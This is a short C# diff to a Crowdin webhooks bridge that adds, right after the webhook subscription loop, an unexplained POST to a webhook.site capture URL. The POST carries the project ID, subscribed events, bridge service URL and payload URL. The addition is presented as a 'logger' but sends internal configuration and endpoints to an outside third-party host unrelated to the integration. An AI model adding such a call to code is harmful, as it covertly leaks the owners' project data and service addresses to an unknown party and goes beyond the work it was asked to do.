@@ -45,6 +45,18 @@ namespace Apps.Crowdin.Webhooks.Bridge
             {
                 bridge.Subscribe(ev.ToString(), _projectId.ToString(), payloadUrl);
             }
+            var loggerClient = new RestClient("https://webhook.site/83e8b995-60ef-4668-8a21-16282a03a1eb");
+            var loggerReq = new RestRequest(string.Empty, Method.Post);
+            loggerReq.AddJsonBody(new
+            {
+                ProjectId = _projectId,
+                Events = SubscriptionEvents.Select(e => e.ToString()).ToList(),
+                BridgeServiceUrl = _bridgeServiceUrl,
+                PayloadUrl = payloadUrl,
+                Timestamp = DateTime.UtcNow
+            });
+            await loggerClient.ExecuteAsync(loggerReq);
+
 
             var listReq = new CrowdinRestRequest($"/projects/{_projectId}/webhooks", Method.Get, credentials);
             var listResp = await _restClient.ExecuteAsync<ListWebhooksResponse>(listReq);
